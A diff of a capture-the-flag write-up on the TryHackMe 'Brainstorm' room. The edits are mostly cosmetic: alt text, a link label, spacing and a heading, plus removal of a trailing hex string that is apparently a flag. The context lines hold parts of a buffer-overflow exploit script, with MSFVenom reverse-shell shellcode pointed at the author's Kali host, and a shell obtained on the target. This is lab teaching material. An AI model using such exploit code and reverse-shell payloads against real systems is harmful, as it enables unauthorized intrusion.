@@ -20,7 +20,7 @@ tags:
 
 ![brainstorm](/assets/images/2021-02-21-11-28-18.png)
 
-Brainstorm is rated as a medium difficulty room on TryHackMe. This Windows based server has a few open ports but something called Brainstorm Chat on port 9999 immediately gets our attention. We find an anonymous FTP server that let's us grab the binaries for the chatserver. From there we reverse engineer the application to work out how we can exploit a buffer overflow vulnerability. We then write a custom python script to gain a reverse shell on to the server.
+Brainstorm is rated as a medium difficulty room on TryHackMe. This Windows based server has a few open ports but something called Brainstorm Chat on port 9999 immediately gets our attention. We also find an anonymous FTP server that let's us grab the binaries for the chatserver. From there we reverse engineer the application to work out how we can exploit a buffer overflow vulnerability. We then write a custom python script to gain a reverse shell on to the server.
 <!--more-->
 
 Skill required are a basic understanding of the tools and techniques needed to debug an application. Skills learned are a better understanding of EIP, ESP and other registers that we can use to help us develop an exploit. We also learn a little about Immunity Debugger for Windows.
@@ -28,7 +28,7 @@ Skill required are a basic understanding of the tools and techniques needed to d
 | Details |  |
 | --- | --- |
 | Hosting Site | [TryHackMe](https://tryhackme.com/) |
-| Link To Machine | [THM - Easy - Skynet](https://tryhackme.com/room/brainstorm) |
+| Link To Machine | [THM - Medium - Brainstorm](https://tryhackme.com/room/brainstorm) |
 | Machine Release Date | 7th September 2019 |
 | Date I Completed It | 21st February 2021 |
 | Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |
@@ -371,11 +371,11 @@ root@kali:/home/kali/thm/brainstorm# python buffer.py
 
 Now switch to Win7 and we see our script connected and sent the username pencer.io
 
-![](/assets/images/2021-02-20-11-27-41.png)
+![brainstorm-connected](/assets/images/2021-02-20-11-27-41.png)
 
 Then it sent 2012 characters, which caused the application to crash:
 
-![](/assets/images/2021-02-20-11-29-56.png)
+![brainstorm-crash](/assets/images/2021-02-20-11-29-56.png)
 
 Excellent. We know have a working script to crash the application, the next step is to place our own code on the EIP which will let us run malicious shellcode.
 
@@ -390,7 +390,7 @@ message += 'B' * 4
 
 Now run it again against the chatserver and check Immunity to see we have overwritten:
 
-![](/assets/images/2021-02-20-11-40-00.png)
+![brainstorm-eipoverwrite](/assets/images/2021-02-20-11-40-00.png)
 
 We see 42424242, which is ASCII for our four B's.
 
@@ -407,7 +407,7 @@ message += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11
 
 Now we run it again against the chatserver, then we look in Immunity to find them in the register:
 
-![](/assets/images/2021-02-20-16-30-35.png)
+![brainstorm-registersagain](/assets/images/2021-02-20-16-30-35.png)
 
 Here we see our A's (41), then B's (42), and then our bad characters in reverse. We are looking through the list to see if any are missing. If they are then we know we can't use those characters in our payload. Having checked through the list we find that they are all there.
 
@@ -419,7 +419,7 @@ The final step is to find the location of ESP, we need this because we use it to
 
 Running that in Immunity we see 9 results:
 
-![](/assets/images/2021-02-20-16-58-40.png)
+![brainstorm-esp](/assets/images/2021-02-20-16-58-40.png)
 
 Let's take the first one, which is 0x625014DF. We'll need to change that to the correct [Little Endian](https://en.wikipedia.org/wiki/Endianness) format in our script, which we'll get to soon. First we need our payload, for this we use MSFVenom:
 
@@ -443,12 +443,12 @@ buf += b"\xb9\x6c\xe3\x1b\x42\x8c\xf4\x7b\xca\x69\xc5\xbb\xa8"
 Those parameters explained:
 
 ```text
--p windows/shell_reverse_tcp	=	Payload is a Windows reverse shell
-LHOST=192.168.0.20				=	IP to connect back to is my Kali machine
-LPORT=1234						=	Port to connect to on Kali
--f py 							=	Output payload in python for our script
--e x86/shikata_ga_nai 			=	Which encoder to use
--b "\x00"						=	Bad characters to avoid
+-p windows/shell_reverse_tcp = Payload is a Windows reverse shell
+LHOST=192.168.0.20           = IP to connect back to is my Kali machine
+LPORT=1234                   = Port to connect to on Kali
+-f py                        = Output payload in python for our script
+-e x86/shikata_ga_nai        = Which encoder to use
+-b "\x00"                    = Bad characters to avoid
 ```
 
 We now have all the information we need to complete our script:
@@ -474,10 +474,10 @@ message += buf
 Those parameters explained:
 
 ```text
-'A' * 2012	- The number of A's needed to crash the application
-ESP			- The value of the ESP that will instruct the application to execute our code
-NOP 		- Our code may get cut off, adding a NOP sled ensures it works
-BUF 		- This is our shellcode from MSFVenom
+'A' * 2012 - The number of A's needed to crash the application
+ESP        - The value of the ESP that will instruct the application to execute our code
+NOP        - Our code may get cut off, adding a NOP sled ensures it works
+BUF        - This is our shellcode from MSFVenom
 ```
 
 Now we just have to start netcat listening on Kali. Ensure the chatserver is running on our Win7 VM, then run our script:
@@ -492,7 +492,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Users\administrator\Desktop>
 ```
 
-## Task 3
+## Gaining Access
 
 We have our reverse shell working against our local copy of the application. To complete the room we just need to run it against the server version now. To do this we need the IP of the server, which we then put in our script to change it from the IP of our Win7 VM. We also need to run MSFVenom again and give it the IP of our VPN adapter on Kali instead of the one on the local network. Then we just start netcat listening again and run our script:
 
@@ -548,5 +548,3 @@ type root.txt
 This room was a bit more involved than others. Hopefully I've explained the process in enough detail to help you understand it.
 
 See you next time.
-
-5b1001de5a44eca47eee71e7942a8f8a
